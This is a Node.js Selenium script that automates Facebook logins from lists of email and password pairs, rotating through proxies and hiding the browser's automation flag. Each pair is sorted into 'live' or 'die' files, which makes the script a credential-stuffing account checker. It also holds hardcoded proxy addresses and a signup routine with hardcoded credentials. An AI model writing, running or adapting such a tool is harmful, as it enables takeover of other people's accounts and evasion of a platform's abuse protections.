const webdriver = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const proxy = require('selenium-webdriver/proxy');
const fs = require('fs');
const { parentPort } = require("worker_threads");

// const PROXY_HOST = '202.29.215.78';
// const PROXY_PORT = '8080';

// const proxyS = {
//   "PROXY_HOST" : "104.248.59.222",
//   "PROXY_PORT" : "12000"
// }
// const proxyServer = `http://${proxyS.PROXY_HOST}:${proxyS.PROXY_PORT}`;
// const proxyConfig = proxy.manual({
//     // http: proxyServer,
//     https: proxyServer
// });

// const SOCKS4_HOST = "49.156.38.126"
// const SOCKS4_PORT = "5678"


// Thiết lập proxy SOCKS4
// const socksProxy = {
//   ipaddress: SOCKS4_HOST,
//   port: SOCKS4_PORT,
//   type: 4
// };


const live = fs.readFileSync('newData.json', 'utf8') ? JSON.parse(fs.readFileSync('newData.json', 'utf8')) : [];
const die = fs.readFileSync('die.json', 'utf8') ?  JSON.parse(fs.readFileSync('die.json', 'utf8')) : [];
// const capabilities = webdriver.Capabilities.chrome();
// capabilities.setProxy(proxyConfig);
let node = {
  'die':die ? die : [],
  'live':live ? live : []
}

const a = async () => {
  const proxyServer = `https://104.248.59.222:12000`;
  const proxyConfig = proxy.manual({
      // http: proxyServer,
      https: proxyServer
  });
  const capabilities = webdriver.Capabilities.chrome();
  await capabilities.setProxy(proxyConfig);
  const options = new chrome.Options();
    options.addArguments("--disable-notifications",'--disable-blink-features=AutomationControlled')
    // options.addArguments(`--proxy-server=socks4://${socksProxy.ipaddress}:${socksProxy.port}`);
    // options.addArguments('--headless', '--disable-gpu', '--disable-dev-shm-usage', '--no-sandbox');
    
      const driver = await new webdriver.Builder()
      .forBrowser('chrome')
      .setChromeOptions(options)
      .withCapabilities(capabilities)
      .build()
      await driver.get('https://mbasic.facebook.com/');
      driver.then(() => console.log('Trình duyệt đã khởi động thành công!'))
    .catch((err) => {
    if (err.toString().includes('ECONNREFUSED')) {
      console.log('Không thể kết nối đến trình duyệt Chrome. Vui lòng kiểm tra lại.');
    } else {
      console.log('Đã xảy ra lỗi: ' + err.message);
    }
  });
  const btn_accept =await driver.wait(webdriver.until.elementsLocated(webdriver.By.css('button[name="accept_only_essential"]')));
    btn_accept[1].click()
   
    
    
}
const loadSite = async (acc,pas,err,proxyArr,countProxy) =>{
  
  try {
  const proxyServer = `http://${proxyArr[countProxy].PROXY_HOST}:${proxyArr[countProxy].PROXY_PORT}`;
  const proxyConfig = proxy.manual({
      // http: proxyServer,
      https: proxyServer
  });
  const capabilities = webdriver.Capabilities.chrome();
  await capabilities.setProxy(proxyConfig);
  const options = new chrome.Options();
    options.addArguments("--disable-notifications",'--disable-blink-features=AutomationControlled')
    // options.addArguments(`--proxy-server=socks4://${socksProxy.ipaddress}:${socksProxy.port}`);
    // options.addArguments('--headless', '--disable-gpu', '--disable-dev-shm-usage', '--no-sandbox');
    const driver = new webdriver.Builder()
    .forBrowser('chrome')
    .setChromeOptions(options)
    .withCapabilities(capabilities)
    .build()
  await driver.get('https://mbasic.facebook.com/');
  driver.then().catch((err)=>{
    console.log("er",err)
  })
  
    const waitUntilPageLoaded = async () => {
        await driver.wait(async () => {
          const readyState = await driver.executeScript('return document.readyState;');
          return readyState === 'complete';
        });
      };
      await waitUntilPageLoaded().then( async ()=>{
        try{
          console.log("start")
          const btn_accept =await driver.wait(webdriver.until.elementsLocated(webdriver.By.css('button[name="accept_only_essential"]')));
          await btn_accept[1].click()
          await logUpForm(driver,acc,pas,async (type)=>{
            if(type == "err")
            { countProxy++
              await driver.quit();
              loadSite(acc,pas,err,proxyArr,countProxy)
            }else if(type=="block"){
              countProxy++
              await driver.quit();
              loadSite(acc,pas,err,proxyArr,countProxy)
            }
            else {
              await driver.quit();
              loadSite(acc,pas,err,proxyArr,countProxy)
            }
          })
        }catch (error) {
          // console.log('check:2')
          // countProxy++
          //   await driver.quit();
          //   loadSite(acc,pas,err,proxyArr,countProxy)
          // await setInput(driver)
        }
      })
    } catch (error) {
      console.log('outzone',error)
    }
    
}


const main = async (listAcc,proxyList) =>{
  for(let i=0;i<listAcc.length;i++){
    try {
      await loadSite(listAcc[i].email,listAcc[i].password,0,proxyList,0)
    } catch (error) {
      console.log('error main',error)
    }
    
  }
}
const exportData = async (acc,pas,type) =>{
 
  await node[type].push({"acc":acc,"pas":pas})
  await fs.writeFile(`${type}.json`, JSON.stringify(node[type]), 'utf8', (err) => {
    if (err) {
      console.error(err);
      return;
    }
  })
}
const logUpForm = async (driver,acc,pas,callback) =>{
  let i =0
  try {
    // const intervalInput = setInterval(async ()=>{
    //   if(i<5)
    //   {
    //     const block =await driver.wait(webdriver.until.elementLocated(webdriver.By.css('div[title="You’re Temporarily Blocked"]')));
    //     if(block){
    //       block.getText().then(async function(text) {
    //         if(text == `You’re Temporarily Blocked`)
    //         {
    //           clearInterval(intervalInput)
    //           await callback('block')
    //         }
    //     });
    //     }
    //   }else {
    //     clearInterval(intervalInput)
    //   }
    // },1500)
        const txt_email =await driver.wait(webdriver.until.elementLocated(webdriver.By.id('m_login_email')));
        await txt_email.sendKeys(acc)
        const txt_pass =await driver.wait(webdriver.until.elementLocated(webdriver.By.css('input[name="pass"]')));
        await txt_pass.sendKeys(pas)
        const btn_login =await driver.wait(webdriver.until.elementLocated(webdriver.By.css('input[name="login"]')));
        await btn_login.click()
          const loginFalse = driver.wait(webdriver.until.elementLocated(webdriver.By.id('login_error')));
          const block = driver.wait(webdriver.until.elementLocated(webdriver.By.css('div[title="You’re Temporarily Blocked"]')));
        if(loginFalse)
        {
          await exportData(acc,pas,'die')
          await callback('die')
        }else if(block){
          callback('block')
        }
        else {
          await exportData(acc,pas,'live')
          await callback('live')
        }
  } catch (error) {
    await callback('err')
  }
}

const setInput = async (driver) =>{
    const username =await driver.wait(webdriver.until.elementLocated(webdriver.By.xpath('//*[@id="signup-account-dialog"]/div/div[1]/div/div/div/div[1]/input')));
    console.log('check',username)
    await username.sendKeys("MegalonDon140396121")
    const pass =await driver.wait(webdriver.until.elementLocated(webdriver.By.css('input[aria-label="Set password"]')));
    await pass.sendKeys("Handanba111.")
    const passConfirm = await driver.wait(webdriver.until.elementLocated(webdriver.By.css('input[aria-label="Repeat password"]')));
    await passConfirm.sendKeys("Handanba111.")
    const checkBoxPolicy =await driver.wait(webdriver.until.elementLocated(webdriver.By.xpath('//*[@id="signup-account-dialog"]/div/div[3]/div/input')));
    const checkBoxOld =await driver.wait(webdriver.until.elementLocated(webdriver.By.xpath('//*[@id="signup-account-dialog"]/div/div[4]/div/input')));
    
    var checkUser =await driver.wait(webdriver.until.elementLocated(webdriver.By.xpath('//*[@id="signup-account-dialog"]/div/div[1]/small/div')));
    var checkCapCha = false
    const intervalCheckUser = setInterval(async () =>{
        if(checkUser){
            checkUser.getAttribute('outerHTML')
            .then(async (html) => {
                console.log('html',html)
                if(html==`<div class="mt-s">Email address is available.</div>`)
                {
                    console.log("User Success!")
                    clearInterval(intervalCheckUser)
                    const btn_Next =await driver.wait(webdriver.until.elementLocated(webdriver.By.css('button[title="Next"]')));
                    await btn_Next.click()
                    
                }else {
                    console.log("User false!")
                    checkUser =await driver.wait(webdriver.until.elementLocated(webdriver.By.xpath('//*[@id="signup-account-dialog"]/div/div[1]/small/div')));
                }
                
            })
        }
       
    },2000)

    await checkBoxPolicy.click()
    await checkBoxOld.click()

    
}


const outPut = async (error,item,die,live) => {
  console.log("Không tìm thấy element",error.message);
      if (error.message.indexOf(`div[aria-label="Messenger"]`) !== -1){
        let newDie = [...die,item]
        await fs.writeFile('die.json', JSON.stringify(newDie), 'utf8', (err) => {
          if (err) {
            console.error(err);
            return;
          }
          console.log('Dữ liệu đã được ghi vào file.');
        });
      }else {
        let newLive = [...live,item]
       await fs.writeFile('die.json', JSON.stringify(newLive), 'utf8', (err) => {
          if (err) {
            console.error(err);
            return;
          }
          console.log('Dữ liệu đã được ghi vào file.');
        });
      }
}


  // parentPort.on("message",async (data) => {
  //   const mailList =await JSON.parse(data.data)
  //   const proxyList =await JSON.parse(data.proxy)
  //   console.log('data',data)
  //   await main(mailList,proxyList)
  // });
const multiThread =async (count) =>{
  for(let i = 0;i <= count;i++)
  {
    const data = await fs.readFileSync(`newData${i}.json`, { encoding: 'utf-8' });
    const proxy = await fs.readFileSync(`newProxy${i}.json`, { encoding: 'utf-8' });
    const obj = {
      data:data,
      proxy:proxy
    }
    const mailList =await JSON.parse(obj.data)
  const proxyList =await JSON.parse(obj.proxy)
    await main(mailList,proxyList)
  }
  }
  multiThread(10)
 